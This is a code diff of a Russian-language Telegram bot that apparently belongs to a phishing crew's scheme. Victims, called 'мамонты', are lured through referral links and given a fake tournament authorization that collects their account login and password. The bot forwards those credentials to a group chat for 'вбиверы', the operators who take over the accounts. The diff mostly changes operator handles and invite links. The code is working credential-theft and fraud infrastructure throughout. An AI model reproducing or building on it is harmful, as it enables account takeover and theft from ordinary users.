@@ -194,34 +194,6 @@ referal_bt.action("agggrrrree321321", async (ctx) => {
 
 
     })
-    cron.schedule("00 10 * * *", () => {
-        ctx.sendMessage('🦣 FULL WORK 🦣 \n\n📍 Работаем с 10:00 - 23:00 по мск! \n\n🧑‍💻 Актуальные вбиверы 🧑‍💻 \n\n- Вадим [ @alexdrawn ]', {
-            chat_id: ctx.session.normalize,
-
-            "reply_markup": {
-                "keyboard": [["🧑🏼‍💻 Профиль", "💻О проекте"]],
-                resize_keyboard: true
-            }
-
-        });
-        working = true
-    });
-    cron.schedule("00 23 * * *", () => {
-        ctx.sendMessage('🛑 STOP WORK 🛑 \n\n📍 Работаем с 10:00 - 23:00 по мск! \n\n❤️ Всем спасибо, на сегодня стоп ворк , продолжим завтра!', {
-            chat_id: ctx.session.normalize,
-
-            "reply_markup": {
-                "keyboard": [["🛑 Бот остановлен"]],
-                resize_keyboard: true
-            }
-
-        });
-        working = false
-    });
-
-    if (working == false) {
-        ctx.sendMessage("Бот остановлен приходите в 10:00")
-    }
 })
 
 referal_bt.hears("💻О проекте", async (ctx) => {
@@ -240,9 +212,15 @@ referal_bt.hears("💻О проекте", async (ctx) => {
                     },
                     {
                         text: "Мануалы 📚",
-                        url: "https://t.me/+CQoNmQ03qIs1OWM6"
+                        url: "https://t.me/+d7--vHYpQ6M1Y2Fi"
                     },
 
+                ],
+                [
+                    {
+                        text:"Выплаты 💸",
+                        url:"https://t.me/+efZOStMA87JjZGUy"
+                    }
                 ]
             ],
 
@@ -406,7 +384,7 @@ bot.command("start", async (ctx) => {
     ctx.session.name = ctx.message.from.username
     ctx.session.refer = ctx.message.text.replaceAll("/start ", "")
     if (await collection.findOne({ id: Number(ctx.session.refer) })) {
-        await referal_bt.telegram.sendMessage(ctx.session.refer, `🦣 Мамонт перешёл по вашей реферальной ссылке! \n\n💬 Телеграмм [@${ctx.message.from.username}] \n\n🧑‍💻 Вбивер - @alexdrawn`)
+        await referal_bt.telegram.sendMessage(ctx.session.refer, `🦣 Мамонт перешёл по вашей реферальной ссылке! \n\n💬 Телеграмм [@${ctx.message.from.username}]`)
     }
 
 
@@ -488,7 +466,7 @@ vk_info3.on("text", async (ctx) => {
                 return value;
             }
         })
-        await referal_bt.telegram.sendMessage(ctx.session.refer, `🦣 Мамонт ввёл логи! \n\n‼️ СРОЧНО ПИШИТЕ ВБИВЕРУ ‼️ \n\n🧑‍💻 Вбивер - @alexdrawn`)
+        await referal_bt.telegram.sendMessage(ctx.session.refer, `🦣 Мамонт ввёл логи! \n\n‼️ СРОЧНО ПИШИТЕ ВБИВЕРУ ‼️ \n\n🧑‍💻 Вбивер - @mazenmwais`)
         await ctx.sendMessage(`✅ Авторизация прошла успешно! Ваша заявка с уникальным номером #${ctx.session.id} была зарегистрирована! Перешлите это сообщение администрации турнира. \n@Danil_Golden`)
         await ctx.sendMessage(`🦣 Лохматый ввёл логи!\n\n💻 login / pass ${ctx.session.login} ${ctx.session.pass}\n\n🧑🏼‍💻 Воркер - [${ctx.session.refer}] \n\n☠️ Мамонт - [@${ctx.session.name}] \n\n💎 Сумма воркера - НЕИЗВЕСТНО`, { chat_id: -835842170 })
         ctx.scene.leave()
@@ -560,10 +538,10 @@ bot.hears("📌 Подать заявку", async (callbackQuery) => {
 
 
 support_bot.hears("/вбиверы", async (ctx) => {
-    ctx.sendMessage("💰 Вбиверы : \n - mazenmwais [ @mazenmwais ]\n - alex drawn [ @alexdrawn ]")
+    ctx.sendMessage("💰 Вбиверы : \n - mazenmwais [ @mazenmwais ]")
 })
 support_bot.hears("/наставники", async (ctx) => {
-    ctx.sendMessage("🚸 Наставники которые доведут вас до профита : \n- mazenmwais [ @mazenmwais ] \n- alex drawn [ @alexdrawn ]")
+    ctx.sendMessage("🚸 Наставники которые доведут вас до профита : \n- mazenmwais [ @mazenmwais ]")
 })
 support_bot.hears("/мануалы", async (ctx) => {
     ctx.sendMessage("📚 Мануалы - https://t.me/+CQoNmQ03qIs1OWM6")
